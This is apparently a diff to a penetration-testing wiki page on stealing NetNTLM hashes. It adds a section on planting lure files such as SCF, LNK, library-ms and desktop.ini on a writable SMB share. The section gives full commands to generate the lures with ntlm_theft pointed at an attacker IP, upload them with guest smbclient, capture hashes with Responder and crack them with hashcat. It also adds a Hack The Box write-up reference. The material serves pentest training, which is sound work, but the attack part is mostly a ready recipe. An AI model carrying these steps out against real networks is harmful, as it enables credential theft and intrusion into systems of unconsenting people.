@@ -4,6 +4,35 @@
 
 **Check all the great ideas from [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) from the download of a microsoft word file online to the ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md and [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**
 
+### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)
+
+If you can **write to a share that users or scheduled jobs browse in Explorer**, drop files whose metadata points to your UNC (e.g. `\\ATTACKER\share`). Rendering the folder triggers **implicit SMB authentication** and leaks a **NetNTLMv2** to your listener.
+
+1. **Generate lures** (covers SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
+
+```bash
+git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
+uv add --script ntlm_theft.py xlsxwriter
+uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
+```
+
+2. **Drop them on the writable share** (any folder the victim opens):
+
+```bash
+smbclient //victim/share -U 'guest%'
+cd transfer\
+prompt off
+mput lure/*
+```
+
+3. **Listen and crack**:
+
+```bash
+sudo responder -I <iface>          # capture NetNTLMv2
+hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
+```
+
+Windows may hit several files at once; anything Explorer previews (`BROWSE TO FOLDER`) requires no clicks.
 
 ### Windows Media Player playlists (.ASX/.WAX)
 
@@ -145,6 +174,7 @@ README.md
 
 
 ## References
+- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
 - [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
 - [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
 - [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
